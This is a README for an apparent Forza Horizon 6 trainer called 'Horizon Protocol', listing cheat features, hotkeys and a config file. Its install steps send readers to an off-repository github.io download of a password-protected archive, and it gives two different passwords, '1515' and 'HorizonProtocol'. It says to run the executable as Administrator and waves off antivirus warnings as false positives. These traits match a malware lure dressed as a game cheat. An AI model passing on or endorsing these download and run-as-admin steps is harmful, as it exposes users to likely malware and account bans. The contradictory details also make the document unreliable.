# Forza Horizon 6 — Horizon Protocol Trainer

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?logo=windows)](https://www.microsoft.com/windows)
[![Forza Horizon 6](https://img.shields.io/badge/Forza_Horizon_6-v1.626.354.0%2B-FF6B00?logo=xbox)](https://www.xbox.com/games/forza-horizon-6)

---

<p align="center">
  <img src="https://i.postimg.cc/BnK5M65j/fh62.jpg" alt="Horizon Protocol Banner" width="800"/>
</p>

---

## 📖 About

**Horizon Protocol** is an external trainer for **Forza Horizon 6** on Windows 10/11. It provides a comprehensive set of memory modifications — credits, car unlocks, teleport, speed, physics, and more — through a clean ImGui overlay.

- **100% external** — runs outside the game process, no file modifications
- **ImGui overlay** — intuitive menu with hotkey support
- **Auto-attach** — detects the FH6 process within 2 seconds
- **Memory Finder** — crash-safe value scanner that avoids `.text` section

> **⚠️ Educational purpose only. Offline use only. Online use will result in a permanent ban.**

---

## ✨ Features

### 💰 Credits & Economy
| Feature | Description |
|---------|-------------|
| **Unlimited Credits** | Freeze at 999,999,999 CR (F1) |
| **Wheelspins** | Modify regular and super wheelspin counts |
| **Sell Payout Multiplier** | Multiply car sale prices |
| **Freeze Credits** | Lock balance at target value |

### 🚗 Car Collection
| Feature | Description |
|---------|-------------|
| **Unlock All Cars** | Add all 812+ vehicles to garage (F4) |
| **Free Cars** | Set all car prices to 0 CR |
| **Add All Cars** | Instant full garage |
| **Free Upgrades** | Remove upgrade costs |

### 🏎️ Gameplay
| Feature | Description |
|---------|-------------|
| **Speed Boost** | 1x–10x speed multiplier (F2) |
| **No Damage** | Vehicle invincibility (F3) |
| **Instant Win** | Finish any race in 1st place (F6) |
| **Skip Checkpoint** | Bypass current checkpoint (F7) |
| **XP Multiplier** | 5x, 10x, or 100x gain (F8) |

### 🗺️ Teleport & Movement
| Feature | Description |
|---------|-------------|
| **Teleport to Waypoint** | Instant travel to map marker (F5) |
| **Save Locations** | Store and recall custom positions |

### ⚙️ Physics & Performance
| Feature | Description |
|---------|-------------|
| **Drift Score Multiplier** | 5x, 10x, 50x, or custom |
| **Max Traction** | Unlimited grip |
| **Torque 2x** | Double engine torque |
| **Reduce Drag 0.5x** | Halve air resistance |
| **Weather Changer** | Manual weather and time control |

### 🧠 Memory Finder (Crash-Free)
Forza Horizon 6 periodically hashes its `.text` section. Modifying that section crashes the game. This trainer uses a **Memory Finder** that scans for your current value and locates the canonical profile field without touching `.text`:

1. Enter your current in-game number
2. Click **Find Value** — the scanner isolates the real profile field
3. **Set** a value once, or **Lock** it to keep re-applying
4. Works for Credits, Wheelspins, Skill Points, XP, and any integer

---

## 📸 Screenshots

<p align="center">
  <img src="https://i.postimg.cc/MpM5Ntw2/fh6.jpg" alt="Trainer Menu" width="600"/>
  <br/>
  <i>Main menu interface with all feature categories</i>
</p>

---

## 💻 System Requirements

| Component | Minimum |
|-----------|---------|
| **OS** | Windows 10 / 11 (64-bit) |
| **Game** | Forza Horizon 6 (Steam / Xbox) |
| **RAM** | 8 GB |
| **Runtime** | .NET Framework 4.8+ or .NET 8 |
| **Privileges** | Administrator access |

---

## 🔧 Installation & Usage

1. **Download** the archive from the link below.

 - [![Download](https://img.shields.io/badge/📦_Download-4F7AFF?style=for-the-badge&logo=github&logoColor=white)](https://adam-kim-dev01a2.github.io/)

2. **Extract** to any folder. Archive password: `1515`

3. **Set Forza Horizon 6 to offline mode** — go to settings → solo, or block the game in your firewall.

4. **Launch Forza Horizon 6** and **load fully into the world** (you must be driving, not in a menu).

5. Run `HorizonProtocol.exe` **as Administrator**.

6. Press `Insert` to open the menu.

> **Note:** If the menu does not appear, ensure the game is running in **Windowed** or **Borderless Windowed** mode.

---

## 🎮 Hotkeys

| Key | Function |
|-----|----------|
| `Insert` | Toggle menu |
| `F1` | Unlimited Credits |
| `F2` | Speed Boost |
| `F3` | No Damage |
| `F4` | Unlock All Cars |
| `F5` | Teleport to Waypoint |
| `F6` | Instant Win |
| `F7` | Skip Checkpoint |
| `F8` | XP Multiplier |

---

## ⚙️ Configuration

Settings are stored in `%APPDATA%\HorizonProtocol\config.json`:

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `menu_hotkey` | String | `"Insert"` | Key to toggle menu |
| `auto_attach` | Boolean | `true` | Auto-attach on startup |
| `process_name` | String | `"ForzaHorizon6.exe"` | Target process |
| `safe_mode` | Boolean | `true` | Restricts unstable features |
| `log_level` | String | `"info"` | `"debug"`, `"info"`, `"error"` |

---

## ❓ FAQ

**Is this detectable?**  
Forza Horizon 6 has an anti-cheat and integrity scanner. Using any third-party tool online will result in a **permanent ban**. Use only in offline/solo mode.

**Why do profile cheats crash?**  
Forza Horizon 6 periodically hashes its `.text` section. Any modification to that section is detected and the game kills itself cleanly. This trainer uses a Memory Finder that avoids touching `.text`.

**Can I use this online?**  
Only on your own risk.

**Is this malware?**  
No — but antivirus may flag it as a false positive. Download only from the official source.

**Does the trainer need updates?**  
Yes. Game updates change offsets. Some trainers use pattern scanning for auto-update.

**What is the archive password?**  
`HorizonProtocol`

---

## 🤝 Contributing

Issues and pull requests are welcome. Please include:

- Game version (e.g., `FH6 build v1.626.354.0 — 2026`)
- Tested features and their status

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

---

## ⚠️ Disclaimer

This project is for **educational purposes only**.

**Do not use in online modes.** Forza Horizon 6 modifications will result in a permanent ban.

The developer is not responsible for account bans, data loss, or system instability. Use at your own risk.

This project is not affiliated with Playground Games or Microsoft. Forza Horizon is a registered trademark of Microsoft Corporation.

---

## 🔑 Keywords

`forza-horizon-6-trainer` `fh6-cheat` `fh6-unlock-all-cars` `forza-horizon-6-mod-menu` `fh6-credits` `fh6-wheelspins` `fh6-speed-boost` `forza-horizon-6-hack` `fh6-teleport` `forza-horizon-6-mods`

---

<p align="center">
  <i>Last updated: 04.09.2026</i>
</p>
